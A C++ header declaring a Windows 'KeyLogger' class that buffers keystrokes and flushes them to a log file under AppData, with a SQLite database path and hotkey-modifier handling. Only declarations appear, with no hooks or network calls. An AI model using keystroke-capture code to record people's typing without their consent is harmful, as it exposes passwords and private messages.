// KeyLogger.hpp
#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include "Utils.hpp"
#include "Types.hpp"
#include "Logger.hpp"
#include "sqlite3.h"
#include <fstream>
#include <filesystem>

class KeyLogger {
    private:
        int launchCounter;
        int flushBufferSize = 10;
        const char* appdata = std::getenv("APPDATA");  // AppData\Roaming
        std::filesystem::path logfilepath = std::filesystem::path(appdata) / "MyApp" / "log" / "logfile.txt";
        PATH dbpath;
    public:
        KeyLogger(){}
        KeyLogger(int lCounter):launchCounter(lCounter){}
        static inline std::string keyBuffer;
        void setDBFilename(PATH initpath);
        void onKeyPress(std::string str);
        void memory(KeyLog* keylog);
        void flushBufferToFile();
        void setLaunchCounter(int lcounter);
        std::string KeyLogger::return_Modifier_from_Hotkey(const Hotkey& current); 
};